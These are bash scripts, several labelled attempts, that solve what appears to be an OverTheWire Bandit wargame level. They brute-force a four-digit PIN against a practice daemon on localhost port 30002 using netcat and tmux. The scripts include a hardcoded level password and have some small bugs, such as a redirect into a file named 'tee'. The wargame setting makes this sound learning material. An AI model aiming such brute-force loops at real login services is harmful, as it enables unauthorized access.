======================[ATTEMPT-1]=========================
#!/bin/bash

echo "lets start..."
nc localhost 30002 | tee samplelogs.log
sleep 0.2
for i in $(seq -w 0000 0010); do
        echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i" | tee -a samplelogs.log
        sleep 0.2
done

======================[ATTEMPT-2]=========================
#!/bin/bash

for i in $(seq -w 0 50); do
    echo "Trying PIN: $i"
    echo "$i" | nc localhost 30002 | tee -a steplogs.log

    if grep -q "success" steplogs.log; then
        echo "✅ Correct PIN found: $i"
        break
    fi
done
======================[ATTEMPT-3]=========================
#!/bin/bash

rm steplogs.log
echo "Attempt to fetch Password for bandit25" >> /tmp/tmp.5inPudak18/steplogs.log
echo "$(date) | Lets nc to 30002:: " >> /tmp/tmp.5inPudak18/steplogs.log

for i in $(seq -w 0 50); do
    echo "Trying PIN: $i"
    if grep -qi "password checker" steplogs.log; then
        echo "$i"
    else
             echo "Trying PIN: $i"
             echo "$i" | nc localhost 30002 | tee -a steplogs.log
    fi
    sleep 0.2
done
echo "End of execution!"

===============================[tmuxmagic.sh]==========================================
#!/bin/bash
# create a new session of tmux - tmux new -s tmuxbandit - this is T1
# Split - (CTrl+b) + % - This is T2
# T1$ nc localhost 30002
# T2$ ./tmuxmagic.sh

rm steplogs.log
echo "Attempt to fetch Password for bandit25" >> /tmp/tmp.5inPudak18/steplogs.log
echo "$(date) | nc is running on port 30002:: " >> /tmp/tmp.5inPudak18/steplogs.log
for i in $(seq -w 0000 9999); do
        echo "trying key:: <pwd> $i" >> tee -a /tmp/tmp.5inPudak18/steplogs.log
        key="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"
        tmux send-keys -t 0 "$key" Enter
        sleep 0.2
        tmux capture-pane -p -t 0 | grep -v '^$' > /tmp/tmp.5inPudak18/reply.log
        if ! tail -n 2 /tmp/tmp.5inPudak18/reply.log | grep -iq "Wrong!"; then
                {
                        echo "==========($(date) | Attempt#: $i )==========="
                        echo "Password to next level: "
                        tail -n 3 /tmp/tmp.5inPudak18/reply.log
                } |  tee -a /tmp/tmp.5inPudak18/steplogs.log
        break
        fi
done
======================================================================================


